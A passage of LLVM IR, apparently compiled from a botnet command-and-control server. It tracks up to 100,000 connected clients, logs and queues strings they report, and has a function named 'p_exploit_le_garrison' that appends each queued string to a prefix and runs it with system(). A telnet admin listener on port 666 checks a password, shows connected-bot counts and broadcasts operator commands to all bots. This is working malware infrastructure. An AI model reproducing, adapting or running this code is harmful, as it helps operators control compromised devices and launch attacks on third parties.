  %184 = call i32 @close(i32 %183)
  br label %203

185:                                              ; preds = %177
  %186 = load i32, i32* %13, align 4
  %187 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %188 = bitcast %union.epoll_data* %187 to i32*
  store i32 %186, i32* %188, align 1
  %189 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %189, align 1
  %190 = load volatile i32, i32* @epollFD, align 4
  %191 = load i32, i32* %13, align 4
  %192 = call i32 @epoll_ctl(i32 %190, i32 1, i32 %191, %struct.epoll_event* %3) #8
  store i32 %192, i32* %6, align 4
  %193 = load i32, i32* %6, align 4
  %194 = icmp eq i32 %193, -1
  br i1 %194, label %195, label %198

195:                                              ; preds = %185
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.12, i64 0, i64 0))
  %196 = load i32, i32* %13, align 4
  %197 = call i32 @close(i32 %196)
  br label %203

198:                                              ; preds = %185
  %199 = load i32, i32* %13, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds [100000 x %struct.clientdata_t], [100000 x %struct.clientdata_t]* @clients, i64 0, i64 %200
  %202 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %201, i32 0, i32 2
  store i8 1, i8* %202, align 1
  br label %100

203:                                              ; preds = %195, %182, %114, %113
  br label %332

204:                                              ; preds = %89
  %205 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %206 = load i32, i32* %10, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %205, i64 %207
  %209 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %208, i32 0, i32 1
  %210 = bitcast %union.epoll_data* %209 to i32*
  %211 = load i32, i32* %210, align 1
  store i32 %211, i32* %16, align 4
  %212 = load i32, i32* %16, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds [100000 x %struct.clientdata_t], [100000 x %struct.clientdata_t]* @clients, i64 0, i64 %213
  store %struct.clientdata_t* %214, %struct.clientdata_t** %17, align 8
  store i32 0, i32* %18, align 4
  %215 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %216 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %215, i32 0, i32 2
  store i8 1, i8* %216, align 1
  br label %217

217:                                              ; preds = %204, %320
  %218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %218, i8 0, i64 2048, i1 false)
  br label %219

219:                                              ; preds = %303, %302, %297, %260, %245, %217
  %220 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %220, i8 0, i64 2048, i1 false)
  %221 = icmp ne i8* %220, null
  br i1 %221, label %222, label %228

222:                                              ; preds = %219
  %223 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %224 = load i32, i32* %16, align 4
  %225 = call i32 @fdgets(i8* %223, i32 2048, i32 %224)
  %226 = sext i32 %225 to i64
  store i64 %226, i64* %19, align 8
  %227 = icmp sgt i64 %226, 0
  br label %228

228:                                              ; preds = %222, %219
  %229 = phi i1 [ false, %219 ], [ %227, %222 ]
  br i1 %229, label %230, label %306

230:                                              ; preds = %228
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %232 = call i8* @strstr(i8* %231, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #10
  %233 = icmp eq i8* %232, null
  br i1 %233, label %234, label %235

234:                                              ; preds = %230
  store i32 1, i32* %18, align 4
  br label %306

235:                                              ; preds = %230
  %236 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  call void @trim(i8* %236)
  %237 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %238 = call i32 @strcmp(i8* %237, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #10
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %246

240:                                              ; preds = %235
  %241 = load i32, i32* %16, align 4
  %242 = call i64 @send(i32 %241, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i64 0, i64 0), i64 5, i32 16384)
  %243 = icmp eq i64 %242, -1
  br i1 %243, label %244, label %245

244:                                              ; preds = %240
  store i32 1, i32* %18, align 4
  br label %306

245:                                              ; preds = %240
  br label %219, !llvm.loop !17

246:                                              ; preds = %235
  %247 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %248 = call i8* @strstr(i8* %247, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i64 0, i64 0)) #10
  %249 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %250 = icmp eq i8* %248, %249
  br i1 %250, label %251, label %269

251:                                              ; preds = %246
  %252 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %253 = call i8* @strstr(i8* %252, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.14, i64 0, i64 0)) #10
  %254 = getelementptr inbounds i8, i8* %253, i64 6
  store i8* %254, i8** %21, align 8
  %255 = load i8*, i8** %21, align 8
  %256 = call i64 @strlen(i8* %255) #10
  %257 = icmp ugt i64 %256, 6
  br i1 %257, label %258, label %260

258:                                              ; preds = %251
  %259 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.15, i64 0, i64 0))
  store i32 1, i32* %18, align 4
  br label %306

260:                                              ; preds = %251
  %261 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %262 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %261, i32 0, i32 1
  %263 = getelementptr inbounds [7 x i8], [7 x i8]* %262, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %263, i8 0, i64 7, i1 false)
  %264 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %265 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %264, i32 0, i32 1
  %266 = getelementptr inbounds [7 x i8], [7 x i8]* %265, i64 0, i64 0
  %267 = load i8*, i8** %21, align 8
  %268 = call i8* @strcpy(i8* %266, i8* %267) #8
  br label %219, !llvm.loop !17

269:                                              ; preds = %246
  %270 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %271 = call i8* @strstr(i8* %270, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0)) #10
  %272 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %273 = icmp eq i8* %271, %272
  br i1 %273, label %274, label %298

274:                                              ; preds = %269
  %275 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %276 = call i8* @strstr(i8* %275, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.16, i64 0, i64 0)) #10
  %277 = getelementptr inbounds i8, i8* %276, i64 7
  store i8* %277, i8** %22, align 8
  %278 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %279 = load i8*, i8** %22, align 8
  %280 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %278, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.17, i64 0, i64 0), i8* %279)
  %281 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %282 = call i32 @fflush(%struct._IO_FILE* %281)
  %283 = call i32 @queue_length(%struct.Queue* bitcast (%struct.Queue** @theQueue to %struct.Queue*))
  %284 = icmp slt i32 %283, 10000
  br i1 %284, label %285, label %291

285:                                              ; preds = %274
  %286 = load %struct.Queue*, %struct.Queue** @theQueue, align 8
  %287 = load i8*, i8** %22, align 8
  %288 = call noalias align 16 i8* @strdup(i8* %287) #8
  %289 = call i32 @queue_enq(%struct.Queue* %286, i8* %288)
  %290 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.18, i64 0, i64 0))
  br label %297

291:                                              ; preds = %274
  %292 = load %struct._IO_FILE*, %struct._IO_FILE** %7, align 8
  %293 = load i8*, i8** %22, align 8
  %294 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %292, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.17, i64 0, i64 0), i8* %293)
  %295 = load %struct._IO_FILE*, %struct._IO_FILE** %7, align 8
  %296 = call i32 @fflush(%struct._IO_FILE* %295)
  br label %297

297:                                              ; preds = %291, %285
  br label %219, !llvm.loop !17

298:                                              ; preds = %269
  %299 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %300 = call i32 @strcmp(i8* %299, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.19, i64 0, i64 0)) #10
  %301 = icmp eq i32 %300, 0
  br i1 %301, label %302, label %303

302:                                              ; preds = %298
  br label %219, !llvm.loop !17

303:                                              ; preds = %298
  %304 = getelementptr inbounds [2048 x i8], [2048 x i8]* %20, i64 0, i64 0
  %305 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i64 0, i64 0), i8* %304)
  br label %219, !llvm.loop !17

306:                                              ; preds = %258, %244, %234, %228
  %307 = load i64, i64* %19, align 8
  %308 = icmp eq i64 %307, -1
  br i1 %308, label %309, label %315

309:                                              ; preds = %306
  %310 = call i32* @__errno_location() #11
  %311 = load i32, i32* %310, align 4
  %312 = icmp ne i32 %311, 11
  br i1 %312, label %313, label %314

313:                                              ; preds = %309
  store i32 1, i32* %18, align 4
  br label %314

314:                                              ; preds = %313, %309
  br label %321

315:                                              ; preds = %306
  %316 = load i64, i64* %19, align 8
  %317 = icmp eq i64 %316, 0
  br i1 %317, label %318, label %319

318:                                              ; preds = %315
  store i32 1, i32* %18, align 4
  br label %321

319:                                              ; preds = %315
  br label %320

320:                                              ; preds = %319
  br label %217

321:                                              ; preds = %318, %314
  %322 = load i32, i32* %18, align 4
  %323 = icmp ne i32 %322, 0
  br i1 %323, label %324, label %329

324:                                              ; preds = %321
  %325 = load %struct.clientdata_t*, %struct.clientdata_t** %17, align 8
  %326 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %325, i32 0, i32 2
  store i8 0, i8* %326, align 1
  %327 = load i32, i32* %16, align 4
  %328 = call i32 @close(i32 %327)
  br label %329

329:                                              ; preds = %324, %321
  br label %330

330:                                              ; preds = %329
  br label %331

331:                                              ; preds = %330
  br label %332

332:                                              ; preds = %331, %203, %70
  %333 = load i32, i32* %10, align 4
  %334 = add nsw i32 %333, 1
  store i32 %334, i32* %10, align 4
  br label %39, !llvm.loop !18

335:                                              ; preds = %39
  br label %35
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #1

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #1

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #3

declare i32 @close(i32) #3

declare i32 @accept(i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #6

declare void @perror(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.41, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.41, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #1

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #4

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #3

declare i32 @fflush(%struct._IO_FILE*) #3

; Function Attrs: nounwind
declare noalias align 16 i8* @strdup(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @p_exploit_le_garrison() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca i8*, align 8
  %3 = alloca [512 x i8], align 16
  store i8* null, i8** %2, align 8
  br label %4

4:                                                ; preds = %8, %0
  %5 = load %struct.Queue*, %struct.Queue** @theQueue, align 8
  %6 = call i8* @queue_deq(%struct.Queue* %5)
  store i8* %6, i8** %2, align 8
  %7 = icmp ne i8* %6, null
  br i1 %7, label %8, label %22

8:                                                ; preds = %4
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.21, i64 0, i64 0))
  %10 = getelementptr inbounds [512 x i8], [512 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %10, i8 0, i64 512, i1 false)
  %11 = getelementptr inbounds [512 x i8], [512 x i8]* %3, i64 0, i64 0
  %12 = call i8* @strcat(i8* %11, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.22, i64 0, i64 0)) #8
  %13 = getelementptr inbounds [512 x i8], [512 x i8]* %3, i64 0, i64 0
  %14 = load i8*, i8** %2, align 8
  %15 = call i8* @strcat(i8* %13, i8* %14) #8
  %16 = getelementptr inbounds [512 x i8], [512 x i8]* %3, i64 0, i64 0
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.17, i64 0, i64 0), i8* %16)
  %18 = getelementptr inbounds [512 x i8], [512 x i8]* %3, i64 0, i64 0
  %19 = call i32 @system(i8* %18)
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.23, i64 0, i64 0))
  %21 = load i8*, i8** %2, align 8
  call void @free(i8* %21) #8
  br label %4, !llvm.loop !19

22:                                               ; preds = %4
  %23 = load i8*, i8** %1, align 8
  ret i8* %23
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #1

declare i32 @system(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 100000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [100000 x %struct.clientdata_t], [100000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !20

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @titleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %20
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @clientsConnected()
  %11 = load volatile i32, i32* @managesConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.24, i64 0, i64 0), i32 27, i32 %10, i32 %11, i32 7) #8
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* %15) #10
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  ret i8* null

20:                                               ; preds = %7
  %21 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #1

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca [2048 x i8], align 16
  store i8* %0, i8** %3, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = ptrtoint i8* %7 to i32
  store i32 %8, i32* %4, align 4
  %9 = load volatile i32, i32* @managesConnected, align 4
  %10 = add nsw i32 %9, 1
  store volatile i32 %10, i32* @managesConnected, align 4
  %11 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %11, i8 0, i64 2048, i1 false)
  %12 = load i32, i32* %4, align 4
  %13 = call i64 @send(i32 %12, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.25, i64 0, i64 0), i64 10, i32 16384)
  %14 = icmp eq i64 %13, -1
  br i1 %14, label %15, label %16

15:                                               ; preds = %1
  br label %84

16:                                               ; preds = %1
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %18 = load i32, i32* %4, align 4
  %19 = call i32 @fdgets(i8* %17, i32 2048, i32 %18)
  %20 = icmp slt i32 %19, 1
  br i1 %20, label %21, label %22

21:                                               ; preds = %16
  br label %84

22:                                               ; preds = %16
  %23 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  call void @trim(i8* %23)
  %24 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %25 = call i32 @strcmp(i8* %24, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0)) #10
  %26 = icmp ne i32 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %22
  br label %84

28:                                               ; preds = %22
  %29 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %29, i8 0, i64 2048, i1 false)
  %30 = load i32, i32* %4, align 4
  %31 = call i64 @send(i32 %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i64 0, i64 0), i64 4, i32 16384)
  %32 = icmp eq i64 %31, -1
  br i1 %32, label %33, label %34

33:                                               ; preds = %28
  br label %84

34:                                               ; preds = %28
  %35 = load i8*, i8** %3, align 8
  %36 = call i32 @pthread_create(i64* %5, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %35) #8
  %37 = load i32, i32* %4, align 4
  %38 = call i64 @send(i32 %37, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.28, i64 0, i64 0), i64 48, i32 16384)
  %39 = icmp eq i64 %38, -1
  br i1 %39, label %40, label %41

40:                                               ; preds = %34
  br label %84

41:                                               ; preds = %34
  %42 = load i32, i32* %4, align 4
  %43 = call i64 @send(i32 %42, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.29, i64 0, i64 0), i64 43, i32 16384)
  %44 = icmp eq i64 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %41
  br label %84

46:                                               ; preds = %41
  %47 = load i32, i32* %4, align 4
  %48 = call i64 @send(i32 %47, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.30, i64 0, i64 0), i64 53, i32 16384)
  %49 = icmp eq i64 %48, -1
  br i1 %49, label %50, label %51

50:                                               ; preds = %46
  br label %84

51:                                               ; preds = %46
  %52 = load i32, i32* %4, align 4
  %53 = call i64 @send(i32 %52, i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.31, i64 0, i64 0), i64 51, i32 16384)
  %54 = icmp eq i64 %53, -1
  br i1 %54, label %55, label %56

55:                                               ; preds = %51
  br label %84

56:                                               ; preds = %51
  %57 = load i32, i32* %4, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [100000 x %struct.telnetdata_t], [100000 x %struct.telnetdata_t]* @managements, i64 0, i64 %58
  %60 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %59, i32 0, i32 0
  store i32 1, i32* %60, align 4
  br label %61

61:                                               ; preds = %77, %76, %56
  %62 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %63 = load i32, i32* %4, align 4
  %64 = call i32 @fdgets(i8* %62, i32 2048, i32 %63)
  %65 = icmp sgt i32 %64, 0
  br i1 %65, label %66, label %83

66:                                               ; preds = %61
  %67 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  call void @trim(i8* %67)
  %68 = load i32, i32* %4, align 4
  %69 = call i64 @send(i32 %68, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.32, i64 0, i64 0), i64 11, i32 16384)
  %70 = icmp eq i64 %69, -1
  br i1 %70, label %71, label %72

71:                                               ; preds = %66
  br label %84

72:                                               ; preds = %66
  %73 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %74 = call i64 @strlen(i8* %73) #10
  %75 = icmp eq i64 %74, 0
  br i1 %75, label %76, label %77

76:                                               ; preds = %72
  br label %61, !llvm.loop !21

77:                                               ; preds = %72
  %78 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.33, i64 0, i64 0), i8* %78)
  %80 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %81 = load i32, i32* %4, align 4
  call void @broadcast(i8* %80, i32 %81)
  %82 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %82, i8 0, i64 2048, i1 false)
  br label %61, !llvm.loop !21

83:                                               ; preds = %61
  br label %84

84:                                               ; preds = %83, %71, %55, %50, %45, %40, %33, %27, %21, %15
  %85 = load i32, i32* %4, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [100000 x %struct.telnetdata_t], [100000 x %struct.telnetdata_t]* @managements, i64 0, i64 %86
  %88 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %87, i32 0, i32 0
  store i32 0, i32* %88, align 4
  %89 = load i32, i32* %4, align 4
  %90 = call i32 @close(i32 %89)
  %91 = load volatile i32, i32* @managesConnected, align 4
  %92 = add nsw i32 %91, -1
  store volatile i32 %92, i32* @managesConnected, align 4
  %93 = load i8*, i8** %2, align 8
  ret i8* %93
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #8
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.34, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = call zeroext i16 @htons(i16 zeroext 666) #11
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %18, i16* %19, align 2
  %20 = load i32, i32* %3, align 4
  %21 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %22 = call i32 @bind(i32 %20, %struct.sockaddr* %21, i32 16) #8
  %23 = icmp slt i32 %22, 0
  br i1 %23, label %24, label %25

24:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.35, i64 0, i64 0))
  br label %25

25:                                               ; preds = %24, %13
  %26 = load i32, i32* %3, align 4
  %27 = call i32 @listen(i32 %26, i32 5) #8
  store i32 16, i32* %5, align 4
  br label %28

28:                                               ; preds = %25, %35
  %29 = load i32, i32* %3, align 4
  %30 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %31 = call i32 @accept(i32 %29, %struct.sockaddr* %30, i32* %5)
  store i32 %31, i32* %4, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp slt i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %28
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.36, i64 0, i64 0))
  br label %35

35:                                               ; preds = %34, %28
  %36 = load i32, i32* %4, align 4
  %37 = sext i32 %36 to i64
  %38 = inttoptr i64 %37 to i8*
  %39 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %38) #8
  br label %28
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #6

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.epoll_event, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #8
  %12 = call %struct.Queue* @queue_init()
  store %struct.Queue* %12, %struct.Queue** @theQueue, align 8
  %13 = load i32, i32* %4, align 4
  %14 = icmp ne i32 %13, 3
  br i1 %14, label %15, label %21

15:                                               ; preds = %2
  %16 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %16, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.37, i64 0, i64 0), i8* %19)
  call void @exit(i32 1) #9
  unreachable

21:                                               ; preds = %2
  %22 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.38, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  store %struct._IO_FILE* %22, %struct._IO_FILE** @fileFD, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 2
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @atoi(i8* %25) #10
  store i32 %26, i32* %7, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = load i8*, i8** %28, align 8
